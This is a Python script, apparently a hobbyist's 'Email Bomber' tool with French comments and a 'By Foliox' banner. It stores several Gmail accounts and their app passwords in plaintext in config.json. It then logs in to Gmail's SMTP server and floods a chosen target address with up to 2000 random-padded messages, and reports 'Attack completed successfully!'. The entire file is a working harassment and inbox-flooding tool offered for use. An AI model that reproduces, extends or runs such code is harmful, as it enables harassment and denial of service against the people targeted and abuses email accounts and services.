from colorama import Fore, Style, init
import smtplib
import random
import string
import os
import time
import platform
import json

# Initialiser colorama
init(autoreset=True)

# Fichier de configuration pour sauvegarder les informations de l'email et du mot de passe d'application
CONFIG_FILE = "config.json"

# Fonction pour générer une chaîne aléatoire
def generate_random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Fonction pour effacer le terminal
def clear_terminal():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

# Fonction pour afficher le logo en bleu ciel, centré, avec un texte "By Foliox"
def display_logo():
    clear_terminal()

    # Création du logo en bleu ciel, centré
    logo = f"""
{Fore.RED}                                 ██████╗  █████╗ ███╗   ██╗███████╗███████╗██████╗  {Fore.RED}               
{Fore.RED}                                 ██╔══██╗██╔══██╗████╗  ██║╚══███╔╝██╔════╝██╔══██╗ {Fore.RED}               
{Fore.RED}                                 ██████╔╝███████║██╔██╗ ██║  ███╔╝ █████╗  ██████╔╝ {Fore.RED}          ____   
{Fore.RED}                                 ██╔═══╝ ██╔══██║██║╚██╗██║ ███╔╝  ██╔══╝  ██╔══██╗  {Fore.RED} .--.--.|_   |  
{Fore.RED}                                 ██║     ██║  ██║██║ ╚████║███████╗███████╗██║  ██║ {Fore.RED}  |  |  | _|  |_ 
{Fore.RED}                                 ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝ {Fore.RED}   \___/ |______|
{Fore.WHITE}                                                     \033[1mBy Foliox


    """
    print(logo.center(120))  # Centre le logo dans une fenêtre de 120 caractères de large

# Fonction pour enregistrer les informations de plusieurs emails et mots de passe d'application
def save_config(emails, app_keys):
    config_data = {"emails": emails, "app_keys": app_keys}
    with open(CONFIG_FILE, "w") as config_file:
        json.dump(config_data, config_file)
    print(f"{Fore.GREEN}Config saved!{Style.RESET_ALL}")
    time.sleep(3)  # Afficher "Config saved!" pendant 3 secondes avant de revenir au menu

# Fonction pour charger la configuration si elle existe
def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as config_file:
            config_data = json.load(config_file)
        return config_data
    else:
        return None

# Fonction pour envoyer des emails
def send_emails(target_email, message_content, num_emails, emails, app_keys):
    try:
        # Répartition équilibrée des emails à envoyer
        emails_per_account = num_emails // len(emails)
        remaining_emails = num_emails % len(emails)

        for idx, email in enumerate(emails):
            app_key = app_keys[idx]
            with smtplib.SMTP('smtp.gmail.com', 587) as smtpserver:
                smtpserver.ehlo()
                smtpserver.starttls()  # Démarrer la connexion sécurisée
                smtpserver.login(email, app_key)
                
                emails_to_send = emails_per_account + (1 if idx < remaining_emails else 0)
                for i in range(emails_to_send):
                    # Créer un message avec contenu aléatoire
                    message = f"{message_content}\n{generate_random_string(20)}{str(i)}"
                    smtpserver.sendmail(email, target_email, message)

                    # Calculer le pourcentage et arrondir à l'entier
                    percent = round((i + 1) / emails_to_send * 100)
                    print(f"{Fore.RED}Sent {i + 1}/{emails_to_send} emails for {email} ({percent}%)...{Style.RESET_ALL}", end="\r")

        print(f"{Fore.GREEN}\nAttack completed successfully!{Style.RESET_ALL}")
        time.sleep(3)
    except smtplib.SMTPAuthenticationError:
        print(f"{Fore.RED}Authentication failed for one of the emails. Please check your credentials.{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}An error occurred: {e}{Style.RESET_ALL}")

# Programme principal
while True:
    display_logo()
    # Menu avec catégorie Config en 1 et Email Bomber en 2
    print(f"{Fore.RED}[{Fore.WHITE}1{Fore.RED}] {Fore.RED}Config{Style.RESET_ALL}")
    print(f"{Fore.RED}[{Fore.WHITE}2{Fore.RED}] {Fore.RED}Email Bomber{Style.RESET_ALL}")
    print(f"{Fore.RED}[{Fore.WHITE}0{Fore.RED}] {Fore.RED}Exit{Style.RESET_ALL}")

    # Afficher la flèche '===>' avant la saisie du choix
    choice = input(f"\n{Fore.RED}===> {Style.RESET_ALL}")

    if choice == "1":
        # Configuration
        num_emails = int(input(f"{Fore.RED}===> {Style.RESET_ALL}How many email addresses do you want to use for spamming? "))

        emails = []
        app_keys = []
        
        for i in range(num_emails):
            email = input(f"{Fore.RED}===> {Style.RESET_ALL}Enter email #{i + 1}: ")
            app_key = input(f"{Fore.RED}===> {Style.RESET_ALL}Enter app password for email #{i + 1}: ")
            emails.append(email)
            app_keys.append(app_key)

        # Sauvegarder la config
        save_config(emails, app_keys)

    elif choice == "2":
        config = load_config()
        if config:
            emails = config['emails']
            app_keys = config['app_keys']
        else:
            print(f"{Fore.RED}Config not found! Please set up the config first.{Style.RESET_ALL}")
            continue

        target_email = input(f"{Fore.RED}===> {Style.RESET_ALL}Target email: ")
        message_content = generate_random_string(100)  # Ajuster la longueur si nécessaire

        try:
            num_emails = int(input(f"{Fore.RED}===> {Style.RESET_ALL}Number of emails to send [1-2000]: "))
        except ValueError:
            print(f"{Fore.RED}Invalid number. Returning to menu.{Style.RESET_ALL}")
            time.sleep(2)
            continue

        send_emails(target_email, message_content, num_emails, emails, app_keys)

    elif choice == "0":
        print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
        break
    else:
        print(f"{Fore.RED}Invalid choice. Try again.{Style.RESET_ALL}")
        time.sleep(2)
